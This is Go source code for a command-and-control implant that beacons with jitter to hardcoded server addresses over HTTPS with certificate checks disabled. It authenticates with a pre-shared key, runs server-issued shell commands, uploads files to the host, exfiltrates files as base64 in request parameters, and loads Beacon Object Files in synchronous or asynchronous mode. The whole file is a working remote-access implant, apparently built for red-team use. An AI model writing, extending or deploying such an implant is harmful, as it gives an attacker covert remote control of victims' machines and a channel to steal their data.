package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"math/rand"

	"github.com/mattn/go-shellwords"
	"github.com/parzel/GoBofRunner/bof"
)

// Configuration
type lupoImplant struct {
	updateInterval int
	protocol       string
	rhost          string
	rport          int
	id             int
	uuid           string
	psk            string
	data           string
}

var implant *lupoImplant

// Async BOF job tracking
type bofJobResult struct {
	id     int
	output string
}

var (
	asyncBOFMu      sync.Mutex
	asyncBOFResults []bofJobResult
	asyncBOFCounter int
)

// packBOFArgs parses and packs BOF arguments into Beacon data format.
// Accepts type-prefixed args (wstring:val, string:val, int:val, short:val).
// Unprefixed args default to wstring since most CS BOFs use WCHAR*.
func packBOFArgs(rawArgs []string) ([]byte, error) {
	buffer := &bof.BOFArgsBuffer{
		Buffer: new(bytes.Buffer),
	}
	for _, arg := range rawArgs {
		parts := strings.SplitN(arg, ":", 2)
		if len(parts) == 2 {
			switch strings.ToLower(parts[0]) {
			case "wstring", "z":
				buffer.AddWString(parts[1])
			case "string", "s":
				buffer.AddString(parts[1])
			case "int", "integer", "i":
				if v, err := strconv.Atoi(parts[1]); err == nil {
					buffer.AddInt(uint32(v))
				} else if v, err := strconv.ParseUint(strings.TrimPrefix(parts[1], "0x"), 16, 32); err == nil {
					buffer.AddInt(uint32(v))
				}
			case "short":
				if v, err := strconv.Atoi(parts[1]); err == nil {
					buffer.AddShort(uint16(v))
				}
			default:
				// Unknown prefix — treat whole arg as wstring
				buffer.AddWString(arg)
			}
		} else {
			// No type prefix — default to wide string (WCHAR*)
			buffer.AddWString(arg)
		}
	}
	return buffer.GetBuffer()
}

func main() {


	var ipList = []string{"192.168.3.227", "127.0.0.1", "10.0.0.0"}
	var currentIPIndex = 0
	var failureCount = 0
	var updateInterval = 1
	// Construct implant

	implant = &lupoImplant{
		updateInterval: updateInterval,
		protocol:       "https://",
		rhost:          ipList[0],
		rport:          1337,
		id:             -1,
		uuid:           "",
		psk:            "wolfpack",
		data:           "",
	}

    
	jitterMin := 0
	jitterMax := 1


	



	// If a root certificate is specified, use it
	config := &tls.Config{}

	// Trust the certpool
	config = &tls.Config{
		InsecureSkipVerify: true,
	}
	
	// Create http client
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: config,
		},
	}

	for {

		rand.Seed(time.Now().UnixNano())

		jitter := rand.Intn(jitterMax-jitterMin+1)+jitterMin

		implant.updateInterval =  updateInterval + jitter

		success := ExecLoop(implant, client)

		if success{
			failureCount = 0
		}else {
			failureCount ++

			if failureCount >=10{
				currentIPIndex = (currentIPIndex + 1) % len(ipList)
				implant.rhost = ipList[currentIPIndex]
				failureCount = 0
			}
		}

		time.Sleep(time.Duration(implant.updateInterval) * time.Second)

		
	}
}

func ExecLoop(implant *lupoImplant, client *http.Client) bool {

	var requestUrl string
	var requestParams string
	var serverResponse map[string]interface{}

	connectionString := implant.protocol + implant.rhost + ":" + strconv.Itoa(implant.rport)

	arch := getArchitecture()


	if implant.id == -1 {

		// Build custom user defined functions
		customFunctions := buildCustomFunctions()

		// Request registration passing a PSK and the register flag as true
		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval) + "&arch=" + arch + "&functions=" + url.QueryEscape(customFunctions)
		requestUrl = connectionString + requestParams

		resp, err := client.Get(requestUrl)

		if err != nil {
			//fmt.Println(err)
			return false
		}

		jsonData, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			return true
		}

		// Parse the JSON response
		err = json.Unmarshal(jsonData, &serverResponse)

		if err != nil {
			return true
		}

		// set the new session info for the implant structure
		implant.id = int(serverResponse["sessionID"].(float64))
		implant.uuid = serverResponse["UUID"].(string)

	} else {
		// Flush any completed async BOF results from background goroutines
		// before checking in for new commands — mirrors CS 4.11 async-execute behaviour
		asyncBOFMu.Lock()
		pending := append([]bofJobResult(nil), asyncBOFResults...)
		asyncBOFResults = nil
		asyncBOFMu.Unlock()

		for _, result := range pending {
			asyncDataStr := "&data=" + url.QueryEscape(fmt.Sprintf("[Async BOF Job %d]\n%s", result.id, result.output))
			asyncParams := "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&user=server" + asyncDataStr + "&arch=" + arch
			client.Get(connectionString + asyncParams)
		}

		// Request new data from the C2 sending all auth in the form of PSK, sessionID, and UUID
		requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&arch=" + arch
		requestUrl = connectionString + requestParams

		resp, err := client.Get(requestUrl)

		if err != nil {
			return true
		}

		jsonData, err := ioutil.ReadAll(resp.Body)

		if err != nil {
			return true
		}

		// We are only expecting raw cmd execution for this basic implant so the only use case is to parse cmd JSON response
		// Here we could also check the data for non-JSON/functional responses that the implant may have implemented
		err = json.Unmarshal(jsonData, &serverResponse)

		if err != nil {
			return true
		}

		// In case of server side issue where we request a session reconnect, set the new session info for the implant structure
		if serverResponse["UUID"] != nil {
			implant.id = int(serverResponse["sessionID"].(float64))
			implant.uuid = serverResponse["UUID"].(string)
			return true
		}

		unparsedCmd := serverResponse["cmd"].(string)
		var operator string
		if serverResponse["user"].(string) != "" {
			operator = serverResponse["user"].(string)
		} else {
			operator = "server"
		}

		if unparsedCmd != "" {

			parsedCmd, err := shellwords.Parse(unparsedCmd)

			// Get the root command
			cmd := parsedCmd[0]

			// Cut off the root command and extract any args if they exist
			argS := parsedCmd[1:]

			var data []byte
			var dataString string
			var fileString string

			if err != nil {
				return true
			}

			// Check if it is a command with our without args and execute appropriately
			if cmd != "" && len(argS) > 0 {
				// Maintain directory context if cd is issued
				if cmd == "cd" {
					os.Chdir(strings.Join(argS, " "))
				} else if cmd == "upload" {

					filename := argS[0]

					fileb64, err := base64.StdEncoding.DecodeString(strings.Join(argS[1:], " "))
					if err != nil {
						return true
					}

					f, err := os.Create(filename)
					if err != nil {
						return true
					}
					defer f.Close()

					if _, err := f.Write(fileb64); err != nil {
						return true
					}
					if err := f.Sync(); err != nil {
						return true
					}
				} else if cmd == "download" {
					filename := argS[0]

					// Open file on disk.
					f, err := os.Open(filename)

					if err != nil {
						return true
					}

					reader := bufio.NewReader(f)
					content, _ := ioutil.ReadAll(reader)

					// Encode as base64.
					encoded := base64.StdEncoding.EncodeToString(content)

					fileString = "&filename=" + url.QueryEscape(filename) + "&file=" + url.QueryEscape(encoded)

				} else if cmd == "updateinterval" {
					implant.updateInterval, err = strconv.Atoi(argS[0])
					if err != nil {
						return true
					}
					dataString = "Implant interval updated to: " + strconv.Itoa(implant.updateInterval)
				} else if cmd == "bof_loader" || cmd == "bof_loader_async" {
					// BOF binary is always the LAST argument (base64), everything else is BOF args
					if len(argS) < 1 {
						dataString = "Error: " + cmd + " requires a BOF binary"
					} else {
						bof_data, err := base64.StdEncoding.DecodeString(argS[len(argS)-1])
						if err != nil {
							dataString = "Error decoding BOF binary: " + err.Error()
						} else if len(bof_data) == 0 {
							dataString = "BOF binary is empty"
						} else {
							// Pack arguments — everything before the last element
							var beaconData []byte
							if len(argS) > 1 {
								bof_args_str := strings.Join(argS[0:len(argS)-1], " ")
								parsedArgs, parseErr := shellwords.Parse(bof_args_str)
								if parseErr == nil && len(parsedArgs) > 0 {
									beaconData, err = packBOFArgs(parsedArgs)
									if err != nil {
										dataString = "BOF error packing arguments: " + err.Error()
										beaconData = nil
									}
								}
							}
							if beaconData == nil {
								// Empty args — produce a valid zero-length beacon data buffer
								empty := &bof.BOFArgsBuffer{Buffer: new(bytes.Buffer)}
								beaconData, _ = empty.GetBuffer()
							}

							if cmd == "bof_loader_async" {
								// --- ASYNC mode: spawn goroutine, return immediately ---
								// Mirrors CS 4.11 async-execute single-shot behaviour:
								// BOF runs in its own goroutine while the implant continues
								// its C2 sleep/check-in loop. The result is queued and
								// flushed to the C2 on the next check-in after completion.
								asyncBOFMu.Lock()
								asyncBOFCounter++
								jobID := asyncBOFCounter
								asyncBOFMu.Unlock()

								go func(jobID int, bofBytes []byte, bofArgs []byte) {
									var output string
									func() {
										defer func() {
											if r := recover(); r != nil {
												output = fmt.Sprintf("BOF crashed: %v", r)
											}
										}()
										result := bof.ParseCoff(bofBytes, bofArgs)
										if result != "" {
											output = result
										} else {
											output = "(no output)"
										}
									}()
									asyncBOFMu.Lock()
									asyncBOFResults = append(asyncBOFResults, bofJobResult{id: jobID, output: output})
									asyncBOFMu.Unlock()
								}(jobID, bof_data, beaconData)

								dataString = fmt.Sprintf("BOF async job %d started", jobID)
							} else {
								// --- SYNC mode: block until BOF completes ---
								func() {
									defer func() {
										if r := recover(); r != nil {
											dataString = fmt.Sprintf("BOF crashed: %v", r)
										}
									}()
									result := bof.ParseCoff(bof_data, beaconData)
									if result != "" {
										data = []byte(result)
									} else {
										dataString = "BOF execution completed with no output"
									}
								}()
							}
						}
					}
				}
			} else if cmd != "" {
				if cmd == "rootme" {
					dataString = "you're not good enough to be root :("
				} else if cmd == "other_func" {
					dataString = "this does nothing it's just a placeholder :)"
				} else {
					data, err = exec.Command(cmd).Output()
				}
			}

			// URL encode data from exec output to account for weird characters like newlines in the URL string
			if dataString == "" {
				if data != nil {
					dataString = "&data=" + url.QueryEscape(string(data))
				}
			} else {
				dataString = "&data=" + url.QueryEscape(dataString)
			}

			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&update=" + strconv.Itoa(implant.updateInterval) + "&user=" + operator + dataString + fileString + "&arch=" + arch
			requestUrl = connectionString + requestParams

			resp, err = client.Get(requestUrl)

			if err != nil {
				return true
			}

		}
	}

	return true
}

func getArchitecture() string {

	arch := runtime.GOOS + "/" + runtime.GOARCH

	return arch

}

func buildCustomFunctions() string {
	custom_functions := []string{
		"\"rootme\":\"gives instant root every time\"",
		"\"other_func\":\"does funky things\""}

	customFunctionStr := "{"
	for index, custom_fun := range custom_functions {

		if index == len(custom_functions)-1 {
			customFunctionStr += custom_fun
		} else {
			customFunctionStr += custom_fun + ","
		}

	}
	customFunctionStr += "}"

	return customFunctionStr
}
